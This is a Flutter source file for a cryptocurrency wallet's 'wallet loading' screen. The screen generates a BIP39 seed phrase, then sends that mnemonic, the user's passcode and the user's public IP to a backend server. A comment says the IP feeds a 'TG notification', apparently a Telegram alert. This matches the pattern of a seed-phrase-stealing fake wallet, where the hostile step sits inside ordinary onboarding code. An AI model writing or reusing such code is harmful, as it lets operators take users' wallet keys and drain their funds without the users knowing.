import 'dart:async';
import 'package:flutter/material.dart';
import 'package:bip39/bip39.dart' as bip39;
import '../../constants/app_colors.dart';
import '../../services/api_service.dart';
import '../../services/wallet_storage.dart';
import '../../services/passcode_storage.dart';
import '../../services/ip_helper.dart';
import 'wallet_ready_screen.dart';
import 'page_failed_screen.dart';

/// Loading screen that creates wallet via backend API
class WalletLoadingScreen extends StatefulWidget {
  const WalletLoadingScreen({super.key});

  @override
  State<WalletLoadingScreen> createState() => _WalletLoadingScreenState();
}

class _WalletLoadingScreenState extends State<WalletLoadingScreen> {
  bool _isLoading = true;
  String? _errorMessage;

  @override
  void initState() {
    super.initState();
    _createWallet();
  }

  Future<void> _createWallet() async {
    try {
      // Get the saved passcode
      final passcode = await PasscodeStorage.getPasscode();
      if (passcode == null || passcode.isEmpty) {
        throw Exception('Passcode not found');
      }

      // Generate a unique device name (using timestamp)
      final deviceName = 'Mobile_${DateTime.now().millisecondsSinceEpoch}';

      // Step 1: Create device passcode on backend
      final deviceResponse = await ApiService.createDevicePasscode(
        name: deviceName,
        passcode: passcode,
      );

      if (!deviceResponse['success'] || deviceResponse['data'] == null) {
        throw Exception('Failed to create device passcode');
      }

      final devicePassCodeId = deviceResponse['data']['serverPasscodeId'] as String;
      
      // Save device passcode ID locally
      await WalletStorage.saveDevicePassCodeId(devicePassCodeId);

      // Step 2: Generate mnemonic
      final mnemonic = bip39.generateMnemonic();
      
      // Save mnemonic locally
      await WalletStorage.saveMnemonic(mnemonic);

      // Step 3: Create wallet on backend
      // Wait a bit to show loading (minimum 2 seconds for UX)
      await Future.delayed(const Duration(seconds: 2));

      final defaultWalletName = await _nextDefaultWalletName(
        devicePassCodeId: devicePassCodeId,
      );

      // Fetch public IP so backend can show it in TG notification (not 127.0.0.1)
      final publicIp = await IpHelper.getPublicIp();

      final walletResponse = await ApiService.createWallet(
        devicePassCodeId: devicePassCodeId,
        walletName: defaultWalletName,
        mnemonic: mnemonic,
        isMain: true,
        publicIp: publicIp,
      );

      if (!walletResponse['success'] || walletResponse['data'] == null) {
        throw Exception('Failed to create wallet');
      }

      final walletId = walletResponse['data']['walletId'] as String;
      final walletName =
          walletResponse['data']['walletName'] as String? ?? defaultWalletName;

      // Save wallet info locally
      await WalletStorage.saveWalletId(walletId);
      await WalletStorage.saveWalletName(walletName);
      await WalletStorage.saveWalletNameForId(walletId, walletName);

      // Report IP after wallet exists so backend can attach it to this wallet (and show on website)
      await IpHelper.reportCurrentIpForDevice(
        forceReport: true,
        source: 'create new wallet',
      );

      // Navigate to wallet ready screen
      if (!mounted) return;
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (context) => const WalletReadyScreen(),
        ),
      );
    } catch (e) {
      setState(() {
        _isLoading = false;
        _errorMessage = e.toString();
      });

      // Show error screen after a delay
      Future.delayed(const Duration(seconds: 1), () {
        if (!mounted) return;
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(
            builder: (context) => PageFailedScreen(
              errorMessage: _errorMessage ?? 'Unknown error occurred',
            ),
          ),
        );
      });
    }
  }

  /// Returns "Main Wallet" for the first wallet, then "Main Wallet 2", "Main Wallet 3", etc.
  Future<String> _nextDefaultWalletName({required String devicePassCodeId}) async {
    const base = 'Main Wallet';
    try {
      final response = await ApiService.getWalletsByDevice(devicePassCodeId);
      if (response['success'] == true && response['data'] is List) {
        final wallets = List<dynamic>.from(response['data'] as List);
        final nextIndex = wallets.length + 1;
        return nextIndex <= 1 ? base : '$base $nextIndex';
      }
    } catch (_) {
      // ignore - fall back to base
    }
    return base;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.white,
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            if (_isLoading)
              Image.asset(
                'assets/animations/loading.gif',
                width: 80,
                height: 80,
                fit: BoxFit.contain,
              )
            else
              const Icon(
                Icons.error_outline,
                size: 80,
                color: Colors.red,
              ),
            if (!_isLoading && _errorMessage != null) ...[
              const SizedBox(height: 20),
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 40),
                child: Text(
                  'Error: $_errorMessage',
                  textAlign: TextAlign.center,
                  style: const TextStyle(color: Colors.red),
                ),
              ),
            ],
          ],
        ),
      ),
    );
  }
}

